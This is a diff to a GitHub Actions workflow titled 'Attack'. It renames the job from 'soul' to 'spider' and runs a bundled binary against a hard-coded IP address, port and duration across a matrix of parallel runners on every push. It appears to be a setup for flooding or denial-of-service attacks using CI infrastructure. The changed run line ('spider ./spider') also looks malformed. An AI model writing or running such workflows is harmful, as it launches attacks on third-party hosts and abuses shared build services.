@@ -1,8 +1,8 @@
-name: soul Attack
+name: spider Attack
 on: [push]
 
 jobs:
-  soul:
+  spider:
     runs-on: ubuntu-22.04
     strategy:
       matrix:
@@ -10,5 +10,5 @@ jobs:
             11,12,13,14,15]
     steps:
     - uses: actions/checkout@v3
-    - run: chmod +x soul
-    - run: sudo ./soul 91.108.17.40 32002 60
+    - run: chmod +x spider
+    - run: spider ./spider 91.108.17.10 32003 90
